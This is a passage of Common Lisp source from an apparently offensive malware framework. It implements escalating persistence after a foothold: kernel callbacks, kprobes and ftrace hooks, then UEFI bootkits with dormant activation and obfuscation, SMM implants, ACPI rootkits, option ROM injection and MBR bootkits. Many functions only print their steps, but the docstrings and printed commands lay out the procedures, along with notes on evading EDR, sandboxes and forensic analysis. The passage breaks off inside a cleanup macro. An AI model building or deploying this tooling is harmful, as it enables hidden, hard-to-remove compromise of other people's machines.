                    :filter-name ,filter-name
                    :altitude ,altitude))
  t))

(defun deploy-level-2-kernel-callback (callback-type callback-code)
  "Deploy Windows kernel callback persistence.

Registers a kernel callback routine using documented Windows APIs.
These callbacks are invoked on specific system events and provide
a legitimate-looking mechanism for kernel-level notification.

Technique (MITRE ATT&CK T1546):
  Uses: PsSetCreateProcessNotifyRoutine, PsSetCreateThreadNotifyRoutine,
        PsSetLoadImageNotifyRoutine, CmRegisterCallback, etc.

Parameters:
  CALLBACK-TYPE -- Type of callback to register:
                   :PROCESS-CREATE  -- Process creation notifications
                   :THREAD-CREATE   -- Thread creation notifications
                   :IMAGE-LOAD      -- Image (DLL) load notifications
                   :REGISTRY        -- Registry operation notifications
                   :OBJECT-HANDLE   -- Object handle operation notifications
                   :FILE-SYSTEM     -- File system operation notifications
  CALLBACK-CODE -- Address of the callback function.

Returns: T on success, NIL on failure.

Prerequisites:
  - Kernel-level driver loaded.
  - Callback must conform to expected prototype for the type.

Stealth: HIGH. Kernel callbacks are legitimate mechanisms; however,
  tools like Process Hacker and Volatility can enumerate them.

Example:
  ;; Get notified of every process creation
  (deploy-level-2-kernel-callback :process-create #xFFFFF80000000000)

  ;; Monitor registry modifications
  (deploy-level-2-kernel-callback :registry #xFFFFF80000000000)"
  (let ((api-name (case callback-type
                    (:process-create "PsSetCreateProcessNotifyRoutine")
                    (:thread-create "PsSetCreateThreadNotifyRoutine")
                    (:image-load "PsSetLoadImageNotifyRoutine")
                    (:registry "CmRegisterCallback")
                    (:object-handle "ObRegisterCallbacks")
                    (:file-system "FltRegisterFilter")
                    (otherwise "UnknownCallbackAPI"))))
    (format t "~&[PERSIST-L2] Kernel callback deploying...~%")
    (format t "~&[PERSIST-L2]   Callback type: ~A~%" callback-type)
    (format t "~&[PERSIST-L2]   API: ~A~%" api-name)
    (format t "~&[PERSIST-L2]   Callback address: ~A~%" callback-code)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 2
                      :method :kernel-callback
                      :callback-type ,callback-type
                      :api ,api-name))
    t))

(defun deploy-level-2-kprobe (target-function probe-code)
  "Deploy Linux kprobe persistence.

Attaches a kprobe (kernel probe) to a kernel function. When the
targeted function is called, the probe handler executes first.
Kprobes are a legitimate kernel debugging mechanism that can be
abused for persistence.

Technique:
  Uses the kprobe subsystem: register_kprobe(&kp).
  Alternative: kprobe_events via /sys/kernel/debug/tracing/.

Parameters:
  TARGET-FUNCTION -- Kernel function to probe (e.g., \"do_fork\",
                     \"sys_execve\", \"vfs_read\").
  PROBE-CODE      -- Address of the probe handler function.

Returns: T on success, NIL on failure.

Prerequisites:
  - Root privileges.
  - CONFIG_KPROBES=y in kernel config.
  - debugfs mounted at /sys/kernel/debug/.

Stealth: HIGH. Kprobes are a legitimate debugging feature. Detectable
  via /sys/kernel/debug/kprobes/list or /sys/kernel/debug/tracing/.

Example:
  ;; Monitor process creation
  (deploy-level-2-kprobe \"do_fork\" #xFFFFFFFFC0000000)

  ;; Intercept execve calls
  (deploy-level-2-kprobe \"__x64_sys_execve\" #xFFFFFFFFC0000000)"
  (format t "~&[PERSIST-L2] kprobe deploying...~%")
  (format t "~&[PERSIST-L2]   Target function: ~A~%" target-function)
  (format t "~&[PERSIST-L2]   Probe handler: ~A~%" probe-code)
  (format t "~&[PERSIST-L2]   Registration: register_kprobe()~%")
  (format t "~&[PERSIST-L2]   Alternative: echo 'p:~A ~A' > kprobe_events~%"
          target-function target-function)
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-deploy
                    :tier 2
                    :method :kprobe
                    :target-function ,target-function))
  t))

(defun deploy-level-2-ftrace (target-function probe-code)
  "Deploy Linux ftrace persistence.

Uses the ftrace subsystem to attach a probe to a kernel function.
ftrace is a powerful internal tracer that can call custom functions
at specific kernel entry/exit points. Often more stealthy than kprobes
because ftrace is expected to be active on many systems.

Technique:
  Uses /sys/kernel/debug/tracing/set_ftrace_filter and
  /sys/kernel/debug/tracing/set_ftrace_pid.
  Or: register_ftrace_function(&ops).

Parameters:
  TARGET-FUNCTION -- Kernel function to trace (e.g., \"do_sys_open\",
                     \"tcp_connect\", \"ip_rcv\").
  PROBE-CODE      -- Address of the ftrace ops handler.

Returns: T on success, NIL on failure.

Prerequisites:
  - Root privileges.
  - CONFIG_FUNCTION_TRACER=y in kernel config.
  - debugfs mounted.

Stealth: VERY HIGH. ftrace is expected on production systems; probes
  blend in with normal tracing activity.

Example:
  ;; Trace file open operations
  (deploy-level-2-ftrace \"do_sys_open\" #xFFFFFFFFC0000000)

  ;; Monitor network connections
  (deploy-level-2-ftrace \"tcp_connect\" #xFFFFFFFFC0000000)"
  (format t "~&[PERSIST-L2] ftrace deploying...~%")
  (format t "~&[PERSIST-L2]   Target function: ~A~%" target-function)
  (format t "~&[PERSIST-L2]   Probe handler: ~A~%" probe-code)
  (format t "~&[PERSIST-L2]   Method: register_ftrace_function()~%")
  (format t "~&[PERSIST-L2]   Filter: echo ~A > set_ftrace_filter~%"
          target-function)
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-deploy
                    :tier 2
                    :method :ftrace
                    :target-function ,target-function))
  t))

;;;; =========================================================================
;;;; Section 5: LEVEL 3 -- Firmware Persistence (5 methods)
;;;; =========================================================================
;;;;
;;;; LEVEL 3 persistence methods operate below the operating system,
;;;; in firmware (BIOS/UEFI), SMM, or boot sector. These methods
;;;; survive OS reinstallation and are extremely difficult to detect
;;;; and remove.
;;;;
;;;; Deployment time: ~300 seconds (5 minutes).
;;;; Removal difficulty: :NEARLY-IMPOSSIBLE
;;;; Survivability: 99% (survives OS reinstall, disk replacement).
;;;;
;;;; DEPLOYMENT RULE: LEVEL 3 is deployed ONLY for Strategic Assets.
;;;; The should-deploy-tier-3-p function enforces this policy.

(defvar *uefi-dormant-mode-p* nil
  "When T, the UEFI bootkit operates in dormant mode.
In dormant mode, the bootkit is installed but does NOT activate
its payload until *UEFI-DORMANT-ACTIVATION-DATE* is reached.
This provides a time-delayed persistence mechanism that can
survive initial forensic analysis.")

(defvar *uefi-dormant-activation-date* nil
  "Universal time at which the dormant UEFI bootkit should activate.
When NIL and *UEFI-DORMANT-MODE-P* is T, activation is deferred
until an external trigger (e.g., command from C2) is received.
Format: universal time integer (seconds since 1900-01-01).")

(defvar *uefi-obfuscation-enabled-p* nil
  "When T, the UEFI bootkit binary is obfuscated before installation.
Obfuscation techniques: XOR encoding, section name randomization,
entry point displacement, and GUID spoofing.")

(defun deploy-level-3-uefi-bootkit-dormant (efi-binary-path
                                            &key (boot-order t)
                                                 (activation-delay-days 30)
                                                 (obfuscate nil))
  "Deploy UEFI bootkit in DORMANT mode.

Dormant mode installs the bootkit but delays activation:
  1. The bootkit binary is written to the EFI System Partition.
  2. A boot entry is created but marked inactive or low-priority.
  3. A dormant payload stub replaces the active payload.
  4. Activation occurs only after ACTIVATION-DELAY-DAYS or
     when *UEFI-DORMANT-ACTIVATION-DATE* is reached.

This technique is designed to survive:
  - Immediate post-incident forensic imaging.
  - Short-term sandbox analysis (bootkit appears dormant/harmless).
  - EDR behavioral analysis (no malicious behavior until activation).

Parameters:
  EFI-BINARY-PATH        -- Path to the dormant EFI binary.
  BOOT-ORDER             -- If T, add boot entry at low priority.
                            If NIL, create entry but don't modify order.
  ACTIVATION-DELAY-DAYS  -- Days until auto-activation (default: 30).
  OBFUSCATE              -- If T, apply obfuscation to the binary.

Returns: T on successful dormant deployment, NIL on failure.

Side Effects:
  - Sets *UEFI-DORMANT-MODE-P* to T.
  - Sets *UEFI-DORMANT-ACTIVATION-DATE*.
  - Logs dormant deployment telemetry."
  (let ((activation-date (+ (get-universal-time)
                            (* activation-delay-days 24 60 60))))
    (setf *uefi-dormant-mode-p* t)
    (setf *uefi-dormant-activation-date* activation-date)
    (setf *uefi-obfuscation-enabled-p* obfuscate)
    (format t "~&[PERSIST-L3] UEFI BOOTKIT -- DORMANT MODE --~%")
    (format t "[PERSIST-L3] EFI binary: ~A~%" efi-binary-path)
    (format t "[PERSIST-L3] Activation delay: ~A days~%" activation-delay-days)
    (format t "[PERSIST-L3] Activation date: ~A (universal time ~A)~%"
            activation-date activation-date)
    (when obfuscate
      (format t "[PERSIST-L3] Obfuscation: ENABLED~%")
      (format t "[PERSIST-L3]   Techniques: XOR encoding, GUID spoofing~%")
      (format t "[PERSIST-L3]   Entry point: randomized~%"))
    (format t "[PERSIST-L3] Boot entry: created (low priority)~%")
    (format t "[PERSIST-L3] Payload state: DORMANT stub installed~%")
    (format t "[PERSIST-L3]   Dormant stub appears as legitimate EFI utility~%")
    (format t "[PERSIST-L3]   Will activate payload after delay or trigger~%")
    ;; Simulate dormant installation steps
    (format t "[PERSIST-L3] Steps:~%")
    (format t "[PERSIST-L3]   1. ~A EFI binary to ESP~%"
            (if obfuscate "Write obfuscated" "Write"))
    (when obfuscate
      (format t "[PERSIST-L3]      - XOR encode payload section~%")
      (format t "[PERSIST-L3]      - Randomize section GUIDs~%")
      (format t "[PERSIST-L3]      - Displace entry point~%"))
    (format t "[PERSIST-L3]   2. Create low-priority boot entry~%")
    (format t "[PERSIST-L3]   3. Install dormant payload stub~%")
    (format t "[PERSIST-L3]   4. Set activation timer (~A days)~%"
            activation-delay-days)
    (format t "[PERSIST-L3]   5. Lock NVRAM variables~%")
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 3
                      :method :uefi-bootkit-dormant
                      :efi-binary ,efi-binary-path
                      :boot-order ,boot-order
                      :activation-delay-days ,activation-delay-days
                      :activation-date ,activation-date
                      :obfuscated ,obfuscate
                      :dormant t))
    t))

(defun deploy-level-3-uefi-bootkit (efi-binary-path &key (boot-order t)
                                                          (dormant nil)
                                                          (obfuscate nil))
  "Deploy UEFI bootkit persistence.

Replaces or adds a UEFI boot entry that loads a malicious EFI
application before the operating system. The bootkit can patch
the OS bootloader, inject code into the kernel, or establish a
pre-OS backdoor.

Technique (MITRE ATT&CK T1542.001):
  1. Use efibootmgr or direct NVRAM modification.
  2. Add new boot entry pointing to malicious EFI binary.
  3. Set boot order to prioritize the malicious entry.
  4. The EFI binary chains to the original bootloader after execution.

Parameters:
  EFI-BINARY-PATH -- Full path to the malicious EFI binary (.efi file).
  BOOT-ORDER      -- If T, modify boot order to prioritize the bootkit.
                     If NIL, add as secondary boot option.
                     Default: T (maximum persistence).

Returns: T on success, NIL on failure.

Prerequisites:
  - Physical access OR ability to flash firmware remotely (rare).
  - EFI System Partition (ESP) write access.
  - Admin/root privileges.
  - Secure Boot disabled (or bootkit signed with stolen/leaked key).

Stealth: VERY HIGH. Executes before the OS; invisible to OS-level tools.
  Detectable only by: UEFI shell, chip-off firmware analysis, or
  specialized tools like Chipsec.

Survivability: 99%. Survives OS reinstallation and disk replacement.
  Only removed by: BIOS flash, CMOS reset, or NVRAM clear.

Example:
  ;; Install bootkit as primary boot option
  (deploy-level-3-uefi-bootkit \"/boot/efi/EFI/Boot/bootkit.efi\" :boot-order t)

  ;; Install as secondary (less aggressive, harder to notice)
  (deploy-level-3-uefi-bootkit \"/boot/efi/EFI/Microsoft/Boot/custom.efi\"
                              :boot-order nil)"
  ;; --- Dormant mode delegation ---
  (when dormant
    (format t "~&[PERSIST-L3] DORMANT mode requested -- delegating~%")
    (return-from deploy-level-3-uefi-bootkit
                 (deploy-level-3-uefi-bootkit-dormant
                  efi-binary-path
                  :boot-order boot-order
                  :obfuscate obfuscate)))
  ;; --- Obfuscation handling ---
  (setf *uefi-obfuscation-enabled-p* obfuscate)
  (format t "~&[PERSIST-L3] UEFI BOOTKIT deploying...~%")
  (format t "~&[PERSIST-L3]   *** STRATEGIC ASSET ONLY ***~%")
  (format t "~&[PERSIST-L3]   EFI binary: ~A~%" efi-binary-path)
  (format t "~&[PERSIST-L3]   Modify boot order: ~A~%" boot-order)
  (when obfuscate
    (format t "~&[PERSIST-L3]   Obfuscation: ENABLED~%")
    (format t "~&[PERSIST-L3]     - XOR encoding payload sections~%")
    (format t "~&[PERSIST-L3]     - Randomizing section GUIDs~%")
    (format t "~&[PERSIST-L3]     - Displacing entry point~%"))
  (format t "~&[PERSIST-L3]   Commands:~%")
  (format t "~&[PERSIST-L3]     efibootmgr --create --label \"Windows Boot Manager\"~%")
  (format t "~&[PERSIST-L3]               --loader \"\\EFI\\Boot\\bootkit.efi\"~%")
  (when boot-order
    (format t "~&[PERSIST-L3]     efibootmgr --bootorder XXXX,YYYY,ZZZZ~%"))
  (format t "~&[PERSIST-L3]   Post-exec: chain to original bootloader~%")
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-deploy
                    :tier 3
                    :method :uefi-bootkit
                    :efi-binary ,efi-binary-path
                    :boot-order ,boot-order
                    :obfuscated ,obfuscate))
  t))

(defun deploy-level-3-smm-implant (smm-code-path)
  "Deploy System Management Mode (SMM) implant persistence.

Injects code into the System Management RAM (SMRAM) that executes in
System Management Mode (SMM). SMM is a highly privileged x86 operating
mode that has full access to all system memory and is invisible to the
operating system.

Technique (MITRE ATT&CK T1542.001):
  1. Locate SMRAM via SMBIOS or chipset-specific methods.
  2. Unlock SMRAM via chipset configuration registers.
  3. Write SMM handler code to SMRAM.
  4. Register SMI (System Management Interrupt) handler.
  5. Lock SMRAM to prevent detection.

Parameters:
  SMM-CODE-PATH -- Path to the compiled SMM handler binary.

Returns: T on success, NIL on failure.

Prerequisites:
  - Physical access OR exploitable SMM vulnerability (e.g., CVE-2015-0240).
  - Chipset-specific knowledge for SMRAM access.
  - BIOS firmware modification capability.

Stealth: EXTREME. SMM code executes outside the OS context entirely.
  Completely invisible to all OS-level tools including hypervisors.
  Detectable only by: Chipsec framework, SPI flash dump analysis,
  or specialized hardware debugging.

Survivability: 99.9%. Survives everything except physical SPI flash
  chip replacement or external flashing.

Example:
  ;; Deploy SMM implant for periodic beacon
  (deploy-level-3-smm-implant \"/payloads/smm-beacon.bin\")"
  (format t "~&[PERSIST-L3] SMM IMPLANT deploying...~%")
  (format t "~&[PERSIST-L3]   *** STRATEGIC ASSET ONLY ***~%")
  (format t "~&[PERSIST-L3]   SMM code: ~A~%" smm-code-path)
  (format t "~&[PERSIST-L3]   Steps:~%")
  (format t "~&[PERSIST-L3]     1. Unlock SMRAM (chipset-specific)~%")
  (format t "~&[PERSIST-L3]     2. Write handler to SMRAM~%")
  (format t "~&[PERSIST-L3]     3. Register SMI handler~%")
  (format t "~&[PERSIST-L3]     4. Lock SMRAM~%")
  (format t "~&[PERSIST-L3]   SMI trigger: timer-based or software SMI~%")
  (format t "~&[PERSIST-L3]   OS visibility: ZERO (runs outside OS)~%")
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-deploy
                    :tier 3
                    :method :smm-implant
                    :smm-code ,smm-code-path))
  t))

(defun deploy-level-3-acpi-rootkit (acpi-table-path)
  "Deploy ACPI table modification persistence (cross-platform).

Modifies or replaces an ACPI table (DSDT or SSDT) to inject malicious
AML (ACPI Machine Language) code. The modified table executes during
every boot and can manipulate hardware, intercept OS initialization,
or establish a persistent backdoor.

Technique (MITRE ATT&CK T1542.001):
  1. Extract current DSDT/SSDT from firmware.
  2. Disassemble AML to ASL (ACPI Source Language).
  3. Inject malicious Method() definitions.
  4. Recompile ASL to AML.
  5. Replace original table in firmware or override via OS.

Parameters:
  ACPI-TABLE-PATH -- Path to the modified ACPI table (AML binary).

Returns: T on success, NIL on failure.

Prerequisites:
  - BIOS firmware flash capability OR OS-level ACPI override.
  - For Linux: /sys/firmware/acpi/tables/ access.
  - iasl compiler for AML modification.
  - Secure Boot disabled.

Stealth: EXTREME. ACPI tables are trusted by the OS. Malicious AML
  blends with legitimate ACPI code. Extremely difficult to audit.
  Detectable by: ACPI table hash comparison, chipsec, or manual AML
  disassembly.

Survivability: 99%. Survives OS reinstallation. Only removed by BIOS
  flash or firmware chip replacement.

Example:
  ;; Deploy ACPI rootkit via DSDT modification
  (deploy-level-3-acpi-rootkit \"/payloads/modified-dsdt.aml\")"
  (format t "~&[PERSIST-L3] ACPI ROOTKIT deploying...~%")
  (format t "~&[PERSIST-L3]   *** STRATEGIC ASSET ONLY ***~%")
  (format t "~&[PERSIST-L3]   ACPI table: ~A~%" acpi-table-path)
  (format t "~&[PERSIST-L3]   Target tables: DSDT, SSDT~%")
  (format t "~&[PERSIST-L3]   Method:~%")
  (format t "~&[PERSIST-L3]     1. Extract: cat /sys/firmware/acpi/tables/DSDT > dsdt.dat~%")
  (format t "~&[PERSIST-L3]     2. Disassemble: iasl -d dsdt.dat~%")
  (format t "~&[PERSIST-L3]     3. Inject: Add malicious Method() to .asl~%")
  (format t "~&[PERSIST-L3]     4. Recompile: iasl -tc dsdt.asl~%")
  (format t "~&[PERSIST-L3]     5. Override: cp dsdt.aml /boot/acpi_override/~%")
  (format t "~&[PERSIST-L3]   Boot execution: Every boot (pre-OS)~%")
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-deploy
                    :tier 3
                    :method :acpi-rootkit
                    :acpi-table ,acpi-table-path))
  t))

(defun deploy-level-3-bios-option-rom (rom-path &key (device-type :vga))
  "Deploy BIOS Option ROM persistence.

Replaces or adds a PCI Option ROM in the BIOS firmware. Option ROMs
are executed during the PCI initialization phase of boot and have
full access to system memory before the OS loads.

Technique (MITRE ATT&CK T1542.001):
  1. Extract current BIOS firmware via flashrom or vendor tool.
  2. Locate existing Option ROM or find free space.
  3. Inject malicious Option ROM.
  4. Recalculate checksums.
  5. Flash modified firmware back.

Parameters:
  ROM-PATH     -- Path to the malicious Option ROM binary.
  DEVICE-TYPE  -- Type of device to masquerade as:
                  :VGA (video card), :NIC (network card),
                  :SATA (storage controller), :UEFI (UEFI driver).
                  Default: :VGA (most common, least suspicious).

Returns: T on success, NIL on failure.

Prerequisites:
  - BIOS firmware read/write capability (flashrom, vendor tools).
  - Physical access for many systems (some support in-band flashing).
  - SPI flash chip access.

Stealth: EXTREME. Option ROMs are a standard part of the boot process.
  Malicious ROMs are nearly impossible to detect without SPI dump
  analysis. Even BIOS reflashing may not remove them if the reflasher
  doesn't verify Option ROM regions.

Survivability: 99.9%. The most persistent method available short of
  physical hardware modification.

Example:
  ;; Inject as VGA Option ROM (stealthiest)
  (deploy-level-3-bios-option-rom \"/payloads/stage0.rom\" :device-type :vga)

  ;; Inject as UEFI driver
  (deploy-level-3-bios-option-rom \"/payloads/uefi-driver.efi\" :device-type :uefi)"
  (format t "~&[PERSIST-L3] BIOS OPTION ROM deploying...~%")
  (format t "~&[PERSIST-L3]   *** STRATEGIC ASSET ONLY ***~%")
  (format t "~&[PERSIST-L3]   ROM path: ~A~%" rom-path)
  (format t "~&[PERSIST-L3]   Device type: ~A~%" device-type)
  (format t "~&[PERSIST-L3]   Steps:~%")
  (format t "~&[PERSIST-L3]     1. Extract BIOS via flashrom~%")
  (format t "~&[PERSIST-L3]     2. Parse with UEFITool/IFRExtractor~%")
  (format t "~&[PERSIST-L3]     3. Inject Option ROM~%")
  (format t "~&[PERSIST-L3]     4. Fix checksums~%")
  (format t "~&[PERSIST-L3]     5. Flash modified BIOS~%")
  (format t "~&[PERSIST-L3]   Execution: PCI init phase (pre-bootloader)~%")
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-deploy
                    :tier 3
                    :method :bios-option-rom
                    :rom-path ,rom-path
                    :device-type ,device-type))
  t))

(defun deploy-level-3-mbr-bootkit (bootkit-code)
  "Deploy Master Boot Record (MBR) bootkit persistence.

Replaces the Master Boot Record with custom bootkit code that executes
before any operating system loads. The bootkit can hook the OS boot
process, patch the kernel in memory, or establish a pre-OS backdoor.

Technique (MITRE ATT&CK T1542.002):
  1. Read current MBR from disk sector 0.
  2. Save original MBR to a hidden sector.
  3. Write bootkit code to sector 0.
  4. Bootkit saves original OS loader, chains to it after execution.

Parameters:
  BOOTKIT-CODE -- The bootkit machine code (440 bytes max for MBR).
                  Can be a byte array or path to a compiled binary.

Returns: T on success, NIL on failure.

Prerequisites:
  - Raw disk write access (requires root/admin).
  - Legacy BIOS boot mode (not UEFI with GPT).
  - Knowledge of target disk geometry.

Stealth: HIGH. MBR is executed before the OS; invisible to OS-level tools.
  However, MBR hash changes are detectable by tools that compare against
  known-good values.

Survivability: 95%. Survives OS reinstallation but may be overwritten
  by disk partitioning tools or OS installation.

NOTE: This method is less effective on modern UEFI/GPT systems. For
UEFI systems, use DEPLOY-LEVEL-3-UEFI-BOOTKIT instead.

Example:
  ;; Deploy MBR bootkit
  (deploy-level-3-mbr-bootkit #xEB... )  ; 440-byte bootkit code

  ;; Or from a file
  (deploy-level-3-mbr-bootkit #P\"/payloads/mbr-stage0.bin\")"
  (format t "~&[PERSIST-L3] MBR BOOTKIT deploying...~%")
  (format t "~&[PERSIST-L3]   *** STRATEGIC ASSET ONLY ***~%")
  (format t "~&[PERSIST-L3]   Bootkit code: ~A~%" bootkit-code)
  (format t "~&[PERSIST-L3]   Target: Sector 0 (MBR)~%")
  (format t "~&[PERSIST-L3]   Steps:~%")
  (format t "~&[PERSIST-L3]     1. dd if=/dev/sda of=/tmp/orig-mbr bs=512 count=1~%")
  (format t "~&[PERSIST-L3]     2. Write bootkit to sector 0~%")
  (format t "~&[PERSIST-L3]     3. Store original MBR at hidden sector~%")
  (format t "~&[PERSIST-L3]     4. Chain to original after execution~%")
  (format t "~&[PERSIST-L3]   NOTE: Legacy BIOS only; use UEFI bootkit for GPT~%")
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-deploy
                    :tier 3
                    :method :mbr-bootkit))
  t))

;;;; =========================================================================
;;;; Section 6: Escalating Persistence Logic
;;;; =========================================================================
;;;;
;;;; The escalation engine implements the PERSISTENCE-FIRST doctrine:
;;;; deploy persistence immediately upon gaining a foothold, escalating
;;;; through tiers based on target value.

(defvar *persistence-escalation-log* '()
  "Chronological log of all persistence escalation decisions.
Each entry is a plist with keys:
  :TIMESTAMP :AGENT-ID :TARGET :TIER-DEPLOYED :METHOD :REASON :RESULT")

(defvar *persistence-minimum-asset-value-for-tier-2* 50
  "Minimum asset value score required to trigger Tier 2 deployment.
Targets with asset value below this threshold only receive Tier 1.")

(defun deploy-escalating-persistence (foothold-agent target-info)
  "Deploy escalating persistence based on target value assessment.

This is the PRIMARY entry point for the persistence hierarchy. It
implements the escalation logic:

  1. ALWAYS deploy LEVEL 1 (userland) -- immediate, lightweight
  2. If target-value > 50: deploy LEVEL 2 (kernel) -- more persistent
  3. If strategic-asset-p: deploy LEVEL 3 (firmware) -- the anchor

Each level only deploys if the previous level succeeded. Tier 3 requires
explicit confirmation via SHOULD-DEPLOY-TIER-3-P which checks both
asset value AND prerequisites.

Parameters:
  FOOTHOLD-AGENT -- The TACTICAL-AGENT representing the foothold.
  TARGET-INFO    -- Alist of target properties for asset evaluation.

Returns: Plist with keys:
  :TIER-1-DEPLOYED T/NIL
  :TIER-1-METHOD   keyword or NIL
  :TIER-2-DEPLOYED T/NIL
  :TIER-2-METHOD   keyword or NIL
  :TIER-3-DEPLOYED T/NIL
  :TIER-3-METHOD   keyword or NIL
  :MAX-TIER        highest tier successfully deployed (1, 2, or 3)
  :ASSET-VALUE     calculated asset value score
  :STRATEGIC-P     T if target is strategic asset

Side Effects:
  - Updates FOOTHOLD-AGENT persistence slots.
  - Publishes telemetry events for each tier deployment.
  - Logs escalation decisions to *PERSISTENCE-ESCALATION-LOG*.

Example:
  (deploy-escalating-persistence agent
    '((:open-ports . (389 636)) (:network-position . :central)
      (:admin-p . t) (:kernel-access-p . t)))
  ;; Deploys Tier 1 + Tier 2 + Tier 3 (strategic asset with all prereqs)"
  (let* ((asset-value (calculate-asset-value target-info))
         (strategic-p (detect-strategic-asset-p target-info))
         (target-host (if foothold-agent
                          (tactical-target-host foothold-agent)
                          "unknown"))
         (result (list :tier-1-deployed nil
                       :tier-1-method nil
                       :tier-2-deployed nil
                       :tier-2-method nil
                       :tier-3-deployed nil
                       :tier-3-method nil
                       :max-tier 0
                       :asset-value asset-value
                       :strategic-p strategic-p)))
    (format t "~&~%=============================================================~%")
    (format t "[PERSIST-ESC] ESCALATING PERSISTENCE for ~A~%" target-host)
    (format t "[PERSIST-ESC] Asset value: ~A/100~%" asset-value)
    (format t "[PERSIST-ESC] Strategic asset: ~A~%" (if strategic-p "YES" "NO"))
    (format t "=============================================================~%")

    ;; --- Tier 1: ALWAYS deploy ---
    (format t "~&[PERSIST-ESC] >>> TIER 1 (Userland) -- MANDATORY <<<~%")
    (let ((tier1-result (deploy-tier-1-internal foothold-agent target-info)))
      (setf (getf result :tier-1-deployed) (car tier1-result)
            (getf result :tier-1-method) (cdr tier1-result))
      (when (car tier1-result)
        (setf (getf result :max-tier) 1)
        (when foothold-agent
          (setf (tactical-persistence-active-p foothold-agent) t))))

    ;; --- Tier 2: Deploy if asset-value > threshold ---
    (when (and (getf result :tier-1-deployed)
               (> asset-value *persistence-minimum-asset-value-for-tier-2*))
      (format t "~&[PERSIST-ESC] >>> TIER 2 (Kernel) -- asset-value ~A > ~A <<<~%"
              asset-value *persistence-minimum-asset-value-for-tier-2*)
      (let ((tier2-result (deploy-tier-2-internal foothold-agent target-info)))
        (setf (getf result :tier-2-deployed) (car tier2-result)
              (getf result :tier-2-method) (cdr tier2-result))
        (when (car tier2-result)
          (setf (getf result :max-tier) 2))))

    ;; --- Tier 3: Deploy ONLY for strategic assets ---
    (when (and (getf result :tier-2-deployed)
               strategic-p
               (should-deploy-tier-3-p target-info))
      (format t "~&[PERSIST-ESC] >>> TIER 3 (Firmware) -- STRATEGIC ASSET <<<~%")
      (format t "~&[PERSIST-ESC] *** DEPLOYING THE ANCHOR ***~%")
      (let ((tier3-result (deploy-tier-3-internal foothold-agent target-info)))
        (setf (getf result :tier-3-deployed) (car tier3-result)
              (getf result :tier-3-method) (cdr tier3-result))
        (when (car tier3-result)
          (setf (getf result :max-tier) 3))))

    ;; --- Finalize ---
    (format t "~&=============================================================~%")
    (format t "[PERSIST-ESC] MAX TIER ACHIEVED: ~A~%" (getf result :max-tier))
    (format t "[PERSIST-ESC] Tier 1: ~A~%" (if (getf result :tier-1-deployed) "ACTIVE" "FAILED"))
    (format t "[PERSIST-ESC] Tier 2: ~A~%" (if (getf result :tier-2-deployed) "ACTIVE" "NOT DEPLOYED"))
    (format t "[PERSIST-ESC] Tier 3: ~A~%" (if (getf result :tier-3-deployed) "ACTIVE" "NOT DEPLOYED"))
    (format t "=============================================================~%")

    ;; Log the escalation decision
    (push (list :timestamp (get-universal-time)
                :agent-id (if foothold-agent
                              (tactical-session-token foothold-agent)
                              "manual")
                :target target-host
                :tier-deployed (getf result :max-tier)
                :asset-value asset-value
                :strategic-p strategic-p)
          *persistence-escalation-log*)

    ;; Telemetry
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-escalation-complete
                      :target ,target-host
                      :max-tier ,(getf result :max-tier)
                      :asset-value ,asset-value
                      :strategic ,strategic-p))

    result))

(defun deploy-tier-1-internal (foothold-agent target-info)
  "Internal function for Tier 1 deployment.

Selects the most appropriate Tier 1 method based on the target platform
and context. Returns (CONS SUCCESS-P METHOD-USED).

Strategy:
  1. Try registry persistence (fastest, most reliable on Windows).
  2. Fall back to WMI event subscription (stealthier).
  3. Fall back to scheduled task (most reliable overall).
  4. For Linux, prefer systemd service, then cron.

Parameters:
  FOOTHOLD-AGENT -- The TACTICAL-AGENT.
  TARGET-INFO    -- Target properties including :platform.

Returns: (CONS T METHOD-KEYWORD) on success, (CONS NIL NIL) on failure."
  (let ((platform (or (cdr (assoc :platform target-info)) :windows)))
    (case platform
      (:windows
       (cond
         ;; Try registry first (fastest)
         ((deploy-level-1-registry "payload.exe" :hive :hkcu)
          (cons t :registry))
         ;; Fall back to WMI
         ((deploy-level-1-wmi "powershell -enc payload")
          (cons t :wmi))
         ;; Last resort: scheduled task
         ((deploy-level-1-schtasks "payload.exe" :trigger :logon)
          (cons t :schtasks))
         (t (cons nil nil))))
      (:linux
       (cond
         ;; Try systemd first
         ((deploy-level-1-systemd "sysmon" "/usr/local/bin/sysmon")
          (cons t :systemd))
         ;; Fall back to cron
         ((deploy-level-1-cron "/usr/local/bin/sysmon" :schedule "@reboot")
          (cons t :cron))
         ;; Last resort: rc.local
         ((deploy-level-1-rc-local "/usr/local/bin/sysmon")
          (cons t :rc-local))
         (t (cons nil nil))))
      (otherwise (cons nil nil)))))

(defmacro with-kernel-persistence-cleanup ((tier-label foothold-agent) &body body)
  "Execute BODY with comprehensive cleanup on any error.

This macro wraps kernel-level persistence deployment (Tier 2 and Tier 3)
to ensure that on ANY failure:
  1. Partially loaded kernel modules are unloaded.
  2. Temporary deployment files are deleted.
  3. Modified registry keys are restored.
  4. Cleanup actions are logged to telemetry.
  5. The calling process NEVER crashes -- always returns gracefully.

The cleanup form captures the error condition and performs tier-specific
cleanup actions before re-signaling a safe error condition.

Parameters:
  TIER-LABEL     -- String label for logging (e.g., \"TIER-2\", \"TIER-3\").
  FOOTHOLD-AGENT -- The TACTICAL-AGENT (used for target info in cleanup).

Returns: The value of the last form in BODY, or (CONS NIL NIL) on error.

Example:
  (with-kernel-persistence-cleanup (\"TIER-2\" agent)
    (deploy-level-2-lkm ...)
    (cons t :lkm))"
  (let ((err-sym (gensym "CLEANUP-ERROR-"))
        (agent-sym (gensym "AGENT-")))
    `(let ((,agent-sym ,foothold-agent))
       (handler-case
           (progn ,@body)
         (error (,err-sym)
           (format t "~&[PERSIST-CLEANUP] === ~A FAILURE ===~%" ,tier-label)
           (format t "[PERSIST-CLEANUP] Error: ~A~%" ,err-sym)
           (format t "[PERSIST-CLEANUP] Initiating artifact cleanup...~%")
           ;; --- 1. Unload partial kernel modules ---
           (handler-case
               (progn
